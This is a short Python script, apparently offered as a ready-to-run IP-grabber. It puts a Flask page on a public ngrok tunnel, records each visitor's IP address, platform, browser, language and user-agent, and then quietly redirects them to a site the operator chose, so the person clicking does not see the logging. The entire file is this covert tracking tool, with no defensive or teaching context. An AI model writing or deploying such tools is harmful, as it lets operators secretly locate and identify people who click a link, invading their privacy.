from flask import render_template
from flask_limiter.util import get_remote_address
from termcolor import colored
from flask import request
from flask import Flask
from pyngrok import ngrok
import threading

site=input(f"[-] enter site to redirect to: ")


app=Flask(__name__)
@app.route('/',methods=['GET','POST'])
def home():
    dataagent=request.user_agent
    print(f"[X] New connection detected")
    data=f"""
ip: {get_remote_address()}
platform: {dataagent.platform}
browser: {dataagent.browser}
version: {dataagent.version}
language: {dataagent.language}
useragent={dataagent.string}"""
    print(data)
    return render_template("index.html",redirect=site)

def ngrokthread():
    print("starting ngrok server")
    http_tunnel = ngrok.connect(5000)
    print(f"ngrok tunnel: {http_tunnel}")

pyngrok=threading.Thread(target=ngrokthread)
pyngrok.start()

app.run(debug=False)

##made by dragon